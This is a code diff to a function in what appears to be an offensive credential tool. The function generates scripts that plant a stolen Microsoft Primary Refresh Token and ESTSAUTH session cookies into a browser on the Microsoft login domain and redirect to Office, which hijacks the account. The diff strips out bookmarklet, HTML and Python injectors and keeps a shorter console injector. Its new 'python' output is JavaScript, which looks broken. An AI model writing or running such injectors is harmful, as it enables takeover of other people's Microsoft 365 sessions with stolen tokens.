@@ -655,113 +655,22 @@ async function getFullPRTCredentialBlob(tokenId) {
 function generateInjectionScripts(blob) {
   const scripts = {
     console: '',
-    bookmarklet: '',
     html: '',
     python: ''
   };
 
   if (!blob.prt) return scripts;
 
-  // Console injection script
-  let consoleScript = '// VGenius PRT Credential Injection\n';
-  consoleScript += '// Open browser console on login.microsoftonline.com and paste this\n\n';
-
-  if (blob.prt) {
-    consoleScript += 'document.cookie = "x-ms-RefreshTokenCredential=' + 
-      encodeURIComponent(blob.prt) + 
-      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
-  }
-
-  if (blob.session_key_jwe) {
-    consoleScript += 'document.cookie = "ESTSAUTH=' + 
-      encodeURIComponent(blob.session_key_jwe) + 
-      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
-  }
-
-  if (blob.tgt_cloud) {
-    consoleScript += 'document.cookie = "ESTSAUTHPERSISTENT=' + 
-      encodeURIComponent(blob.tgt_cloud) + 
-      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
-  }
-
-  consoleScript += '\nconsole.log("[VGenius] PRT credentials injected");\n';
-  consoleScript += 'setTimeout(function() { window.location.href = "https://www.office.com/"; }, 3000);';
+  const consoleScript = [
+    '// GraphSpy PRT-only injection',
+    'document.cookie = "x-ms-RefreshTokenCredential=' + encodeURIComponent(blob.prt) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None";',
+    'console.log("[GraphSpy] PRT cookie set");',
+    'setTimeout(function() { window.location.href = "https://www.office.com/"; }, 2000);'
+  ].join('\n');
 
   scripts.console = consoleScript;
-
-  // Bookmarklet
-  const bookmarkletCode = '(function(){' +
-    'var cookies=[' +
-    '{n:"x-ms-RefreshTokenCredential",v:"' + encodeURIComponent(blob.prt || '') + '",d:".login.microsoftonline.com"}' +
-    (blob.session_key_jwe ? ',{n:"ESTSAUTH",v:"' + encodeURIComponent(blob.session_key_jwe) + '",d:".login.microsoftonline.com"}' : '') +
-    (blob.tgt_cloud ? ',{n:"ESTSAUTHPERSISTENT",v:"' + encodeURIComponent(blob.tgt_cloud) + '",d:".login.microsoftonline.com"}' : '') +
-    '];' +
-    'cookies.forEach(function(c){' +
-    'document.cookie=c.n+"="+encodeURIComponent(c.v)+"; domain="+c.d+"; path=/; Secure; SameSite=None";' +
-    '});' +
-    'setTimeout(function(){window.location.href="https://www.office.com/";},2000);' +
-    '})()';
-
-  scripts.bookmarklet = 'javascript:' + bookmarkletCode;
-
-  // HTML standalone injector
-  const cookieArray = [
-    { name: 'x-ms-RefreshTokenCredential', value: blob.prt || '', domain: '.login.microsoftonline .com' },
- ];
-  if (blob.session_key_jwe) {
-    cookieArray.push({ name: 'ESTSAUTH', value: blob.session_key_jwe, domain: '.login.microsoftonline.com' });
-  }
-  if (blob.tgt_cloud) {
-    cookieArray.push({ name: 'ESTSAUTHPERSISTENT', value: blob.tgt_cloud, domain: '.login.microsoftonline.com' });
-  }
-  
-  const cookieJson = JSON.stringify(cookieArray);
-
-  scripts.html = '<!DOCTYPE html>\n<html><head><title>VGenius PRT Injector</title></head><body>\n' +
-    '<h1>PRT Credential Injector</h1>\n' +
-    '<button onclick="inject()">Inject & Login</button>\n' +
-    '<div id="status"></div>\n' +
-    '<script>\n' +
-    'var cookies = ' + cookieJson + ';\n' +
-    'function inject() {\n' +
-    '  for (var i = 0; i < cookies.length; i++) {\n' +
-    '    document.cookie = cookies[i].name + "=" + encodeURIComponent(cookies[i].value) + \n' +
-    '      "; domain=" + cookies[i].domain + "; path=/; Secure; SameSite=None";\n' +
-    '  }\n' +
-    '  document.getElementById("status").innerHTML = "Injected! Redirecting...";\n' +
-    '  setTimeout(function(){ window.location.href = "https://www.office.com/"; }, 2000);\n' +
-    '}\n' +
-    '</script></body></html>';
-
-  // Python script
-  const pythonCookieArray = [
-    { name: 'x-ms-RefreshTokenCredential', value: blob.prt || '', domain: '.login.microsoftonline.com' },
-  ];
-  if (blob.session_key_jwe) {
-    pythonCookieArray.push({ name: 'ESTSAUTH', value: blob.session_key_jwe, domain: '.login.microsoftonline.com' });
-  }
-  if (blob.tgt_cloud) {
-    pythonCookieArray.push({ name: 'ESTSAUTHPERSISTENT', value: blob.tgt_cloud, domain: '.login.microsoftonline.com' });
-  }
-
-  scripts.python = '#!/usr/bin/env python3\n' +
-    'import requests\n\n' +
-    'cookies = ' + JSON.stringify(pythonCookieArray, null, 2) + '\n\n' +
-    'session = requests.Session()\n\n' +
-    'print("Injecting PRT credentials...")\n' +
-    'for cookie in cookies:\n' +
-    '    session.cookies.set(\n' +
-    '        name=cookie["name"],\n' +
-    '        value=cookie["value"],\n' +
-    '        domain=cookie["domain"],\n' +
-    '        secure=True,\n' +
-    '        samesite="None"\n' +
-    '    )\n' +
-    '    print(f"Injected: {cookie[\'name\']}")\n\n' +
-    'print("\\nSession ready! Testing with Office.com...")\n' +
-    'r = session.get("https://www.office.com/", headers={"Accept": "text/html"})\n' +
-    'print(f"Office.com status: {r.status_code}")\n' +
-    'print(f"Authenticated: {\'account\' in r.headers.lower() or \'login\' not in r.url}")';
+  scripts.html = '<script>' + consoleScript + '</script>';
+  scripts.python = 'document.cookie = "x-ms-RefreshTokenCredential=' + encodeURIComponent(blob.prt) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None"';
 
   return scripts;
 }
